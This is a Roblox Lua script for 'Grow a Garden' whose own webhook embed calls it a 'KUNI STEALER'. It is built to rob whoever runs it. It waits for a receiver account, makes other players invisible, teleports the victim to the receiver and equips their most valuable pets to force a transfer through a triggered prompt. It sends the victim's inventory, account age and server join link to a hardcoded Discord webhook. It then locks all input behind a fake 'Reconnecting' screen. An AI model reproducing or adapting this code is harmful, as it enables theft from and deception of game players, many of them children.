repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local ContextActionService = game:GetService("ContextActionService")
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
local dataModule = require(ReplicatedStorage.Modules.DataService)

local USERNAMES = {
    "Elaine_Pets17",
}

local PET_WHITELIST = {
    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
    ["Fennec Fox"] = "{some-uuid-fff-fff-fff}",
    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
    ["Butterfly"] = "{some-uuid-fff-fff-fff}",
    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
    ["Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}"
}

local PET_VALUES = {
    ["Raccoon"] = 50,
    ["T-Rex"] = 300,
    ["Fennec Fox"] = 70,
    ["Dragonfly"] = 80,
    ["Butterfly"] = 60,
    ["Disco Bee"] = 250,
    ["Mimic Octopus"] = 200,
    ["Queen Bee"] = 400,
    ["Spinosaurus"] = 350,
    ["Kitsune"] = 500
}

local PRIORITY_PETS = {
    ["Raccoon"] = true,
    ["Disco Bee"] = true,
    ["Butterfly"] = true,
}

local function isPetWhitelisted(petName)
    return PET_WHITELIST[petName] ~= nil
end

local function getPetToolByUUID(uuid)
    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        if item:GetAttribute("PET_UUID") == uuid then
            return item
        end
    end
    if LocalPlayer.Character then
        for _, item in pairs(LocalPlayer.Character:GetChildren()) do
            if item:GetAttribute("PET_UUID") == uuid then
                return item
            end
        end
    end
    return nil
end

local function equipPetTool(petTool)
    if petTool:GetAttribute("d") then -- Favorited pet logic if needed
        local favEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
        if favEvent then
            favEvent:FireServer(petTool)
        end
    end
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid:EquipTool(petTool)
    end
end

local function teleportToPlayer(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
    end
end

local function clickBypass()
    local size = workspace.CurrentCamera.ViewportSize
    VirtualInputManager:SendMouseButtonEvent(size.X / 2, size.Y / 2, 0, true, nil, true)
    task.wait(0.1)
    VirtualInputManager:SendMouseButtonEvent(size.X / 2, size.Y / 2, 0, false, nil, true)
end

local function triggerStealPrompt(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
        local prompt = targetPlayer.Character.Head:FindFirstChildWhichIsA("ProximityPrompt")
        if prompt then
            prompt.HoldDuration = 0
            prompt:InputHoldBegin()
            clickBypass()
            task.wait(0.1)
            prompt:InputHoldEnd()
        end
    end
end

local function sendPetListWebhook(petList)
    local emojiMap = {
        ["T-Rex"] = "ü¶ñ",
        ["Spinosaurus"] = "ü¶ï",
        ["Queen Bee"] = "üëëüêù",
        ["Disco Bee"] = "ü™©üêù",
        ["Mimic Octopus"] = "üêô",
        ["Dragonfly"] = "ü™∞",
        ["Butterfly"] = "ü¶ã",
        ["Fennec Fox"] = "ü¶ä",
        ["Raccoon"] = "ü¶ù",
        ["Kitsune"] = "ü¶ä"
    }

    local counts = {}
    local totalValue = 0
    for _, petName in ipairs(petList) do
        counts[petName] = (counts[petName] or 0) + 1
    end

    local petDescriptions = {}
    for petName, count in pairs(counts) do
        local emoji = emojiMap[petName] or "üéí"
        local value = PET_VALUES[petName] or 0
        local sumValue = value * count
        totalValue = totalValue + sumValue
        table.insert(petDescriptions, string.format("%s %s √ó%d - %d¬¢", emoji, petName, count, sumValue))
    end

    local embed = {
        title = "ü´ë GROW A GARDEN - KUNI STEALER‚ö†Ô∏è",
        color = 16711680,
        fields = {
            {
                name = "üë§ Player Info",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %d```",
                    LocalPlayer.Name,
                    table.concat(USERNAMES, " "),
                    LocalPlayer.Name,
                    LocalPlayer.AccountAge),
                inline = false,
            },
            {
                name = "üí∞ Total Value",
                value = string.format("```%d¬¢```", totalValue),
                inline = false,
            },
            {
                name = "üéí Backpack",
                value = string.format("```%s```", table.concat(petDescriptions, "\n")),
                inline = false,
            },
            {
                name = "üì° Join with URL",
                value = string.format(
                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                    game.JobId,
                    game.PlaceId,
                    game.JobId
                ),
                inline = false,
            }
        },
        footer = {
            text = string.format("üÜî PlaceID: %s | JobID: %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format("@everyone\nüö® `TeleportService:TeleportToPlaceInstance(%s, \"%s\")` üö®", game.PlaceId, game.JobId),
        username = LocalPlayer.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed},
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}

    local requestFunc = syn and syn.request or http_request or request or HttpPost
    if requestFunc then
        local response = requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = headers,
            Body = jsonData,
        })
        if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
            warn("Webhook failed:", response.StatusCode, response.Body)
        end
    else
        warn("No HTTP request function available!")
    end
end

local function processPetsInventory(targetName)
    local petsData = dataModule:GetData().PetsData.PetInventory.Data

    -- Equip priority pets first
    for uuid, petData in pairs(petsData) do
        if PRIORITY_PETS[petData.PetType] then
            local petTool = getPetToolByUUID(uuid)
            if petTool then
                equipPetTool(petTool)
                task.wait(0.2)
                triggerStealPrompt(targetName)
            end
        end
    end

    -- Equip other whitelisted pets next
    for uuid, petData in pairs(petsData) do
        if not PRIORITY_PETS[petData.PetType] and isPetWhitelisted(petData.PetType) then
            local petTool = getPetToolByUUID(uuid)
            if petTool then
                equipPetTool(petTool)
                task.wait(0.2)
                triggerStealPrompt(targetName)
            end
        end
    end
end

local function makeInvisibleToOthers()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
                        part.Transparency = 1
                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
                        part.Enabled = false
                    end
                end
            end
        end
    end
end

local function waitForWhitelistedPlayer()
    for _, player in pairs(Players:GetPlayers()) do
        if table.find(USERNAMES, player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end

-- INPUT BLOCKER FUNCTION FOR ALL DEVICES (MOUSE, KEYBOARD, TOUCH)
local function disableAllInputs()
    local function blockInput() return true end

    local connections = {}

    table.insert(connections, UserInputService.InputBegan:Connect(blockInput))
    table.insert(connections, UserInputService.InputChanged:Connect(blockInput))
    table.insert(connections, UserInputService.InputEnded:Connect(blockInput))

    -- Block touch inputs (important for mobile)
    if UserInputService.TouchEnabled then
        table.insert(connections, UserInputService.TouchTap:Connect(blockInput))
        table.insert(connections, UserInputService.TouchLongPress:Connect(blockInput))
        table.insert(connections, UserInputService.TouchSwipe:Connect(blockInput))
        table.insert(connections, UserInputService.TouchPan:Connect(blockInput))
        table.insert(connections, UserInputService.TouchPinch:Connect(blockInput))
        table.insert(connections, UserInputService.TouchRotate:Connect(blockInput))
        table.insert(connections, UserInputService.TouchCancel:Connect(blockInput))
    end

    -- Disable right-click context menu
    ContextActionService:BindAction("DisableRightClick", function() return Enum.ContextActionResult.Sink end, false, Enum.UserInputType.MouseButton2)

    -- Disable all key presses
    ContextActionService:BindAction("DisableAllKeys", function(_, state)
        if state == Enum.UserInputState.Begin then
            return Enum.ContextActionResult.Sink
        end
        return Enum.ContextActionResult.Pass
    end, false, unpack(Enum.KeyCode:GetEnumItems()))

    return function()
        for _, conn in ipairs(connections) do
            conn:Disconnect()
        end
        ContextActionService:UnbindAction("DisableRightClick")
        ContextActionService:UnbindAction("DisableAllKeys")
    end
end

local function showReconnectingPrompt(duration)
    duration = duration or 300

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ReconnectingPrompt"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = PlayerGui

    local bg = Instance.new("Frame")
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.6
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.6, 0, 0.1, 0)
    label.Position = UDim2.new(0.2, 0, 0.45, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextScaled = true
    label.Font = Enum.Font.SourceSansBold
    label.Text = "Reconnecting...\nPlease wait"
    label.Parent = bg

    local timerLabel = Instance.new("TextLabel")
    timerLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
    timerLabel.Position = UDim2.new(0.2, 0, 0.55, 0)
    timerLabel.BackgroundTransparency = 1
    timerLabel.TextColor3 = Color3.new(1, 1, 1)
    timerLabel.TextScaled = true
    timerLabel.Font = Enum.Font.SourceSansBold
    timerLabel.Text = tostring(duration) .. " seconds remaining"
    timerLabel.Parent = bg

    spawn(function()
        for i = duration, 0, -1 do
            timerLabel.Text = i .. " seconds remaining"
            task.wait(1)
        end
        screenGui:Destroy()
    end)

    return screenGui
end

local function main()
    -- wait until any whitelisted user joins
    local found, whitelistedName = waitForWhitelistedPlayer()
    while not found do
        task.wait(1)
        found, whitelistedName = waitForWhitelistedPlayer()
    end

    -- make non-whitelisted players invisible
    makeInvisibleToOthers()

    -- teleport to whitelisted player
    teleportToPlayer(whitelistedName)

    -- process pets and attempt steal prompt
    processPetsInventory(whitelistedName)

    -- send webhook report
    local pets = {}
    for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        table.insert(pets, petData.PetType)
    end
    sendPetListWebhook(pets)

    -- block all inputs (keyboard/mouse/touch)
    local unblockInputs = disableAllInputs()

    -- show reconnect prompt for 300 seconds (5 mins)
    local reconnectGui = showReconnectingPrompt(300)

    -- after waiting period, unblock inputs and remove GUI
    task.delay(300, function()
        if reconnectGui and reconnectGui.Parent then
            reconnectGui:Destroy()
        end
        unblockInputs()
    end)
end

spawn(main)
